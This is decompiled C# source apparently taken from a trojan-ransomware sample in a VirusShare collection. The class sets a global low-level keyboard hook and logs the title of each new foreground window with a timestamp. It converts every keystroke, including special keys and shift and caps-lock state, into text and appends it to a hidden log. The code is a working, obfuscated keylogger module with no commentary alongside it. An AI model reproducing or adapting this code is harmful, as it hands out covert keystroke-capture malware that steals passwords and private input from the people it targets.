// Decompiled with JetBrains decompiler
// Type: #f.#zD
// Assembly: SynMood, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E74E0BE3-2156-4FD1-87D6-9C934F391488
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.asay-91a905762db9f9c40fe89fad88d7cbf29ff032af.exe

using \u0023f;
using \u0023i;
using \u0023Ye;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace \u0023f
{
  internal class \u0023zD
  {
    private static \u0023zD.\u0023Uc \u00237G = (\u0023zD.\u0023Uc) null;
    private static IntPtr \u00238G = (IntPtr) 0;
    private static string \u00239G = (string) null;

    [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0023Nc([In] int obj0, [In] \u0023zD.\u0023Uc obj1, [In] int obj2, [In] int obj3);

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", SetLastError = true)]
    public static extern IntPtr \u0023Pc();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLength", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int \u0023Rc([In] IntPtr obj0);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \u0023Qc([In] int obj0, [In] StringBuilder obj1, [In] int obj2);

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
    private static extern int \u0023EC(
      uint _param0,
      uint _param1,
      byte[] _param2,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder _param3,
      int _param4,
      uint _param5,
      IntPtr _param6);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
    private static extern bool \u0023MC([In] byte[] obj0);

    [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
    private static extern uint \u0023NC([In] uint obj0, [In] uint obj1);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0023OC([In] IntPtr obj0, [In] ref int obj1);

    [DllImport("user32", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0023PC([In] int obj0);

    public static string \u0023aH([In] IntPtr obj0)
    {
      string str1;
      try
      {
        if (obj0.ToInt32() > 0)
          goto label_2;
label_1:
        if (true)
        {
          str1 = (string) null;
          goto label_19;
        }
        else
          goto label_19;
label_2:
        IntPtr num1 = obj0;
        StringBuilder stringBuilder1;
        int num2;
        IntPtr num3;
        while (true)
        {
          int num4 = \u0023zD.\u0023Rc(num1);
          if (true)
            goto label_13;
label_4:
          int num5;
          num2 = num5;
          if (true)
          {
            if (num2 != 0)
            {
              StringBuilder stringBuilder2 = new StringBuilder(num5 + 1);
              if (true)
                goto label_15;
label_8:
              num3 = obj0;
              if (false)
              {
                num1 = num3;
                continue;
              }
              goto label_9;
label_15:
              stringBuilder1 = stringBuilder2;
              goto label_8;
            }
            else
              break;
          }
          else
            goto label_10;
label_13:
          num5 = num4;
          goto label_4;
        }
        if (true)
        {
          str1 = (string) null;
          goto label_19;
        }
        else
          goto label_19;
label_9:
        num2 = \u0023zD.\u0023Qc((int) num3, stringBuilder1, stringBuilder1.Capacity);
label_10:
        string str2 = stringBuilder1.ToString().Trim();
        if (true)
          goto label_16;
label_11:
        if (false)
          goto label_1;
        else
          goto label_19;
label_16:
        str1 = str2;
        goto label_11;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
        {
          str1 = (string) null;
          ProjectData.ClearProjectError();
        }
        while (false);
      }
label_19:
      return str1;
    }

    public static void \u0023bH()
    {
      try
      {
        \u0023zD.\u00237G = new \u0023zD.\u0023Uc(\u0023zD.\u0023yD);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        \u0023zD.\u00238G = (IntPtr) \u0023zD.\u0023Nc(13, \u0023zD.\u00237G, (int) Process.GetCurrentProcess().MainModule.BaseAddress, 0);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static int \u0023yD([In] int obj0, [In] int obj1, [In] ref \u0023zD.\u0023AD obj2)
    {
      try
      {
        string str1 = \u0023zD.\u0023aH(\u0023zD.\u0023Pc());
        if (true)
          goto label_6;
label_1:
        string Left;
        if (Operators.CompareString(Left, \u0023zD.\u00239G, false) != 0)
        {
          if (true)
          {
            \u0023zD.\u00239G = Left;
            string[] strArray1 = new string[6];
            if (true)
              goto label_7;
label_4:
            string[] strArray2;
            strArray2[0] = \u0023xD.\u0023PG;
            strArray2[1] = \u0023h.\u0023g(3098);
            strArray2[2] = Left;
            strArray2[3] = \u0023h.\u0023g(3111);
            string[] strArray3 = strArray2;
            DateTime now = DateTime.Now;
            if (true)
              goto label_8;
label_5:
            DateTime dateTime;
            string str2 = dateTime.ToString();
            strArray3[4] = str2;
            strArray2[5] = \u0023h.\u0023g(3120);
            \u0023xD.\u0023PG = string.Concat(strArray2);
            goto label_10;
label_8:
            dateTime = now;
            goto label_5;
label_7:
            strArray2 = strArray1;
            goto label_4;
          }
          else
            goto label_10;
        }
        else
          goto label_10;
label_6:
        Left = str1;
        goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_10:
      int num1;
      try
      {
        string str3 = \u0023h.\u0023g(244);
        if (true)
          goto label_74;
label_11:
        string str4;
        int num2;
        if (obj1 == 260 | obj1 == 256)
        {
          int num3;
          int num4;
          switch (obj2.\u0023dH)
          {
            case 8:
              \u0023xD.\u0023PG = \u0023xD.\u0023PG.Substring(0, \u0023xD.\u0023PG.Length - 1);
              goto label_71;
            case 9:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3504), \u0023h.\u0023g(2977));
              goto label_71;
            case 13:
              str4 = \u0023h.\u0023g(444);
              goto label_71;
            case 16:
            case 160:
            case 161:
              str4 = (string) null;
              goto label_71;
            case 18:
            case 164:
            case 165:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3646), \u0023h.\u0023g(2977));
              goto label_71;
            case 20:
              str4 = !Control.IsKeyLocked(Keys.Capital) ? \u0023Ob.\u00235G(\u0023h.\u0023g(3759), \u0023h.\u0023g(2977)) : \u0023Ob.\u00235G(\u0023h.\u0023g(3726), \u0023h.\u0023g(2977));
              goto label_71;
            case 27:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3538), \u0023h.\u0023g(2977));
              goto label_71;
            case 32:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3717), \u0023h.\u0023g(2977));
              goto label_71;
            case 33:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3663), \u0023h.\u0023g(2977));
              goto label_71;
            case 34:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3688), \u0023h.\u0023g(2977));
              if (false)
                goto case 9;
              else
                goto label_71;
            case 35:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3190), \u0023h.\u0023g(2977));
              goto label_71;
            case 36:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3173), \u0023h.\u0023g(2977));
              goto label_71;
            case 37:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3453), \u0023h.\u0023g(2977));
              goto label_71;
            case 38:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3466), \u0023h.\u0023g(2977));
              goto label_71;
            case 39:
              num3 = 3427;
              goto label_45;
            case 40:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3440), \u0023h.\u0023g(2977));
              goto label_71;
            case 46:
              int num5 = 3521;
              if (num5 == 0)
              {
                num3 = num5;
                goto label_45;
              }
              else
              {
                str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(num5), \u0023h.\u0023g(2977));
                goto label_71;
              }
            case 91:
            case 92:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3617), \u0023h.\u0023g(2977));
              goto label_71;
            case 96:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3297), \u0023h.\u0023g(2977));
              goto label_71;
            case 97:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3306), \u0023h.\u0023g(2977));
              goto label_71;
            case 98:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3315), \u0023h.\u0023g(2977));
              goto label_71;
            case 99:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3324), \u0023h.\u0023g(2977));
              goto label_71;
            case 100:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3333), \u0023h.\u0023g(2977));
              goto label_71;
            case 101:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3342), \u0023h.\u0023g(2977));
              goto label_71;
            case 102:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3351), \u0023h.\u0023g(2977));
              goto label_71;
            case 103:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3360), \u0023h.\u0023g(2977));
              goto label_71;
            case 104:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3369), \u0023h.\u0023g(2977));
              goto label_71;
            case 105:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3378), \u0023h.\u0023g(2977));
              goto label_71;
            case 112:
            case 113:
            case 114:
            case 115:
            case 116:
            case 117:
            case 118:
            case 119:
            case 120:
            case 121:
            case 122:
            case 123:
            case 124:
            case 125:
            case 126:
            case (int) sbyte.MaxValue:
            case 128:
            case 129:
            case 130:
            case 131:
            case 132:
            case 133:
            case 134:
            case 135:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3405), \u0023h.\u0023g(2977)) + Conversions.ToString(obj2.\u0023dH - 111) + \u0023Ob.\u00235G(\u0023h.\u0023g(3418), \u0023h.\u0023g(2977));
              goto label_71;
            case 144:
              str4 = !\u0023mb.\u0023jb().Keyboard.NumLock ? \u0023Ob.\u00235G(\u0023h.\u0023g(3588), \u0023h.\u0023g(2977)) : \u0023Ob.\u00235G(\u0023h.\u0023g(3555), \u0023h.\u0023g(2977));
              goto label_71;
            case 162:
            case 163:
              str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3479), \u0023h.\u0023g(2977));
              goto label_71;
            case 186:
              str4 = !(\u0023mb.\u0023jb().Keyboard.ShiftKeyDown | Control.IsKeyLocked(Keys.Capital)) ? \u0023Ob.\u00235G(\u0023h.\u0023g(3270), \u0023h.\u0023g(2977)) : \u0023Ob.\u00235G(\u0023h.\u0023g(3261), \u0023h.\u0023g(2977));
              goto label_71;
            case 187:
              num4 = \u0023mb.\u0023jb().Keyboard.ShiftKeyDown ? 1 : 0;
              break;
            case 188:
              str4 = !(\u0023mb.\u0023jb().Keyboard.ShiftKeyDown | Control.IsKeyLocked(Keys.Capital)) ? \u0023Ob.\u00235G(\u0023h.\u0023g(3837), \u0023h.\u0023g(2977)) : \u0023Ob.\u00235G(\u0023h.\u0023g(3828), \u0023h.\u0023g(2977));
              goto label_71;
            case 189:
              if (\u0023mb.\u0023jb().Keyboard.ShiftKeyDown | Control.IsKeyLocked(Keys.Capital))
              {
                if (true)
                {
                  str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3810), \u0023h.\u0023g(2977));
                  goto label_71;
                }
                else
                  goto case 18;
              }
              else
              {
                str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3819), \u0023h.\u0023g(2977));
                goto label_71;
              }
            case 190:
              if (\u0023mb.\u0023jb().Keyboard.ShiftKeyDown | Control.IsKeyLocked(Keys.Capital))
              {
                string str5 = \u0023Ob.\u00235G(\u0023h.\u0023g(3137), \u0023h.\u0023g(2977));
                if (true)
                {
                  str4 = str5;
                  goto label_71;
                }
                else
                  goto label_71;
              }
              else
              {
                string str6 = \u0023Ob.\u00235G(\u0023h.\u0023g(3146), \u0023h.\u0023g(2977));
                if (true)
                {
                  str4 = str6;
                  goto label_71;
                }
                else
                  goto label_71;
              }
            case 191:
              if (\u0023mb.\u0023jb().Keyboard.ShiftKeyDown | Control.IsKeyLocked(Keys.Capital))
              {
                int num6 = 3155;
                if (num6 != 0)
                {
                  str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(num6), \u0023h.\u0023g(2977));
                  goto label_71;
                }
                else
                {
                  num2 = num6;
                  goto label_73;
                }
              }
              else
              {
                str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3164), \u0023h.\u0023g(2977));
                goto label_71;
              }
            case 192:
              str4 = !(\u0023mb.\u0023jb().Keyboard.ShiftKeyDown | Control.IsKeyLocked(Keys.Capital)) ? \u0023Ob.\u00235G(\u0023h.\u0023g(3801), \u0023h.\u0023g(2977)) : \u0023Ob.\u00235G(\u0023h.\u0023g(3792), \u0023h.\u0023g(2977));
              goto label_71;
            case 219:
              str4 = !(\u0023mb.\u0023jb().Keyboard.ShiftKeyDown | Control.IsKeyLocked(Keys.Capital)) ? \u0023Ob.\u00235G(\u0023h.\u0023g(3216), \u0023h.\u0023g(2977)) : \u0023Ob.\u00235G(\u0023h.\u0023g(3207), \u0023h.\u0023g(2977));
              goto label_71;
            case 220:
              if (\u0023mb.\u0023jb().Keyboard.ShiftKeyDown | Control.IsKeyLocked(Keys.Capital))
              {
                str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(3243), \u0023h.\u0023g(2977));
                goto label_71;
              }
              else
              {
                int num7 = 3252;
                if (num7 != 0)
                {
                  str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(num7), \u0023h.\u0023g(2977));
                  goto label_71;
                }
                else
                {
                  num4 = num7;
                  break;
                }
              }
            case 221:
              str4 = !(\u0023mb.\u0023jb().Keyboard.ShiftKeyDown | Control.IsKeyLocked(Keys.Capital)) ? \u0023Ob.\u00235G(\u0023h.\u0023g(3234), \u0023h.\u0023g(2977)) : \u0023Ob.\u00235G(\u0023h.\u0023g(3225), \u0023h.\u0023g(2977));
              goto label_71;
            case 222:
              str4 = !(\u0023mb.\u0023jb().Keyboard.ShiftKeyDown | Control.IsKeyLocked(Keys.Capital)) ? \u0023Ob.\u00235G(\u0023h.\u0023g(3288), \u0023h.\u0023g(2977)) : \u0023Ob.\u00235G(\u0023h.\u0023g(3279), \u0023h.\u0023g(2977));
              goto label_71;
            default:
              try
              {
                str4 = !(\u0023mb.\u0023jb().Keyboard.ShiftKeyDown | Control.IsKeyLocked(Keys.Capital)) ? \u0023zD.\u0023cH((uint) obj2.\u0023dH).ToLower() : \u0023zD.\u0023cH((uint) obj2.\u0023dH).ToUpper();
                goto label_71;
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                str4 = \u0023h.\u0023g(244);
                ProjectData.ClearProjectError();
                goto label_71;
              }
          }
          int num8 = Control.IsKeyLocked(Keys.Capital) ? 1 : 0;
          str4 = (num4 | num8) == 0 ? \u0023Ob.\u00235G(\u0023h.\u0023g(3396), \u0023h.\u0023g(2977)) : \u0023Ob.\u00235G(\u0023h.\u0023g(3387), \u0023h.\u0023g(2977));
          goto label_71;
label_45:
          str4 = \u0023Ob.\u00235G(\u0023h.\u0023g(num3), \u0023h.\u0023g(2977));
label_71:
          Console.Write(str4);
          \u0023xD.\u0023PG += str4;
          \u0023xD.\u0023RG = \u0023xD.\u0023PG;
        }
        num2 = 0;
label_73:
        num1 = num2;
        goto label_78;
label_74:
        str4 = str3;
        goto label_11;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        num1 = 0;
        ProjectData.ClearProjectError();
      }
label_78:
      return num1;
    }

    public static string \u0023cH([In] uint obj0)
    {
      string str1;
      try
      {
        StringBuilder stringBuilder1 = new StringBuilder();
        if (true)
          goto label_15;
label_1:
        int length = (int) byte.MaxValue;
        byte[] numArray1;
        IntPtr num1;
        uint num2;
        while (true)
        {
          byte[] numArray2 = new byte[length];
          if (true)
            goto label_16;
label_3:
          int num3;
          if (true)
            num3 = \u0023zD.\u0023MC(numArray1) ? 1 : 0;
          else
            goto label_9;
label_5:
          if (true)
            goto label_17;
label_6:
          bool flag;
          if (flag)
          {
            int num4 = (int) \u0023zD.\u0023NC(obj0, 0U);
            if (true)
            {
              num2 = (uint) num4;
              goto label_9;
            }
            else
              goto label_9;
          }
          else
            break;
label_17:
          flag = num3 != 0;
          goto label_6;
label_9:
          IntPtr num5 = \u0023zD.\u0023Pc();
          if (true)
            goto label_20;
label_10:
          int num6 = 0;
          IntPtr num7;
          num3 = \u0023zD.\u0023OC(num7, ref num6);
          if (true)
          {
            int num8 = num3;
            int num9;
            do
            {
              num9 = num8;
              if (true)
                num1 = (IntPtr) \u0023zD.\u0023PC(num9);
              else
                goto label_24;
            }
            while (false);
            goto label_14;
label_24:
            length = num9;
            continue;
          }
          goto label_5;
label_20:
          num7 = num5;
          goto label_10;
label_16:
          numArray1 = numArray2;
          goto label_3;
        }
        string str2 = \u0023h.\u0023g(244);
        if (true)
        {
          str1 = str2;
          goto label_23;
        }
        else
          goto label_23;
label_14:
        StringBuilder stringBuilder2;
        \u0023zD.\u0023EC(obj0, num2, numArray1, stringBuilder2, 5, 0U, num1);
        str1 = stringBuilder2.ToString();
        goto label_23;
label_15:
        stringBuilder2 = stringBuilder1;
        goto label_1;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return ((Keys) obj0).ToString();
label_23:
      return str1;
    }

    private delegate int \u0023Uc([In] int obj0, [In] int obj1, [In] ref \u0023zD.\u0023AD obj2);

    public struct \u0023AD
    {
      public int \u0023dH;
      public int \u0023eH;
      public int \u0023fH;
      public int \u0023gH;
      public int \u0023hH;
    }
  }
}
